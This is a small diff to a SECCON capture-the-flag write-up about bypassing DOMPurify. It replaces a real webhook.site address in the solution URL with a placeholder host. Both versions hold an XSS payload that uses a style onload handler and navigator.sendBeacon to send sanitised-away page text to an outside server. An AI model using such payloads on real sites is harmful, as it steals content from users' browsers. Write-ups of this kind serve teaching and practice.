@@ -42,6 +42,6 @@ SECCON{<img id='}
   <style/onload=navigator.sendBeacon("https://server/leak",DOMPurify.removed[0].element.innerText>'><iframe>
 ```
 
-After sending `http://web:3000/result?message=SECCON{<img/id='}%0a<style/onload=navigator.sendBeacon("https://webhook.site/e1898219-2d03-4382-85a7-f9ef118f90a3",DOMPurify.removed[0].element.innerText)>'><iframe>` to the bot, we've got the flag:
+After sending `http://web:3000/result?message=SECCON{<img/id='}%0a<style/onload=navigator.sendBeacon("https://server/leak",DOMPurify.removed[0].element.innerText)>'><iframe>` to the bot, we've got the flag:
 
 **SECCON{w0w_yoU_div3d_deeeeeep_iNto_DOMPurify}**
